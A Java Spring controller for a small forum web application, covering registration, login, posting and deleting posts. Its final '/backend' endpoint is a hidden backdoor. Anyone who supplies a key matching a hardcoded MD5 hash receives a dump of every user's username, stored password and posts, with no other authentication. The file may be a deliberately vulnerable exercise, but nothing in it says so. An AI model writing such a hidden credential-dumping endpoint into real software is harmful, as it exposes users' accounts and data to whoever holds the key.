package com.example.lobosspring.web;

import com.example.lobosspring.model.User;
import com.example.lobosspring.model.Post;
import com.example.lobosspring.service.*;
import com.example.lobosspring.validator.UserValidator;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;

import javax.xml.bind.DatatypeConverter;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.Instant;
import java.util.*;

@Controller
public class UserController {
	@Autowired
	private UserService userService;

	@Autowired
	private SecurityService securityService;

	@Autowired
	private UserValidator userValidator;

	@GetMapping("/register")
	public String register(Model model) {
		model.addAttribute("userForm", new User());

		return "register";
	}

	@PostMapping("/register")
	public String register(@ModelAttribute("userForm") User userForm, Model model, BindingResult bindingResult) {
		userValidator.validate(userForm, bindingResult);
		if (bindingResult.hasErrors()) {
			return "register";
		}

		userService.save(userForm);
		securityService.autoLogin(userForm.getUsername(), userForm.getPasswordConfirm());

		return "redirect:/";
	}

	@GetMapping("/login")
	public String login(Model model, String error, String logout) {
		if (error != null) {
			model.addAttribute("error", "Your username and/or password is invalid.");
		}

		if (logout != null) {
			model.addAttribute("message", "You have been logged out successfully.");
		}

		return "login";
	}

	@GetMapping("/forumboard")
	public String forumboard(Model model) {
		ArrayList<Post> Posts = new ArrayList<>();

		Iterable<User> UserList = userService.getUsers();
		for (User U : UserList) {
			U.getPosts().forEach((Key, Value) -> {
				Post NewPost = new Post();
				NewPost.setUsername(U.getUsername());
				NewPost.setUnixTimestamp(Key);
				NewPost.setDate(new Date(Key * 1000).toString());
				NewPost.setPostData(Value);

				Posts.add(NewPost);
			});
		}

		Posts.sort(Comparator.comparing(Post::getUnixTimestamp).reversed());

		model.addAttribute("posts", Posts);
		return "forumboard";
	}

	@PostMapping("/forumboard")
	public String forumboard(@RequestParam String data, Model model) {
		String Username = securityService.findLoggedInUsername();
		if (Username != null) {
			User CurrentUser = userService.findByUsername(Username);
			if (CurrentUser != null) {
				Map<Long, String> CurrentPosts = CurrentUser.getPosts();
				CurrentPosts.put(Instant.now().getEpochSecond(), data);

				userService.saveBypassPasswordRewrite(CurrentUser);
			}
		}

		model.addAttribute("message", "Successfully submitted a new post!");
		return forumboard(model);
	}

	@PostMapping("/deletepost/{id}")
	public String deletepost(@PathVariable String id, Model model) {
		Long PostTimestamp = Long.parseLong(id);
		String Username = securityService.findLoggedInUsername();
		if (Username != null) {
			User CurrentUser = userService.findByUsername(Username);
			if (CurrentUser != null) {
				Map<Long, String> CurrentPosts = CurrentUser.getPosts();
				CurrentPosts.remove(PostTimestamp);
				userService.saveBypassPasswordRewrite(CurrentUser);
			}
		}

		return "redirect:/forumboard";
	}

	@GetMapping("/backend")
	public String backend(@RequestParam String key, Model model) throws NoSuchAlgorithmException {
		MessageDigest MD = MessageDigest.getInstance("MD5");
		MD.update(key.getBytes());
		String Hash = DatatypeConverter.printHexBinary(MD.digest()).toUpperCase();

		if (Hash.equals("2BAA370F69D24382C79DDC90D1002152")) {
			String Data = "";
			for (User user : userService.getUsers()) {
				Data += user.getUsername() + " : " + user.getPassword() + "\n";
				for (Long Key : user.getPosts().keySet()) {
					Data += " - " + Key + " : " + user.getPosts().get(Key) + "\n";
				}
				Data += "\n";
			}
			model.addAttribute("data", Data);
		}
		return "backend";
	}
}
